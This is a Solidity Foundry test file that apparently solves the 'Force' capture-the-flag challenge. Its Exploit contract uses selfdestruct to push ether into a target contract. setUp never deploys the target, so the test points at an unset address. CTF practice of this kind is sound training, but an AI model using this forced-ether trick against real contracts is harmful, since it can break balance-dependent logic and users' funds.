// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Force} from "../src/Force.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract ForceTest is Test {
    Utilities internal utils;
    Force internal force;

    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        attacker = users[1];
        vm.label(attacker, "Attacker");
    }

    function testExploit() public {
        new Exploit{value: 1 ether}(payable(address(force)));
        assertEq(address(force).balance, 1 ether);
    }
}

contract Exploit {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}
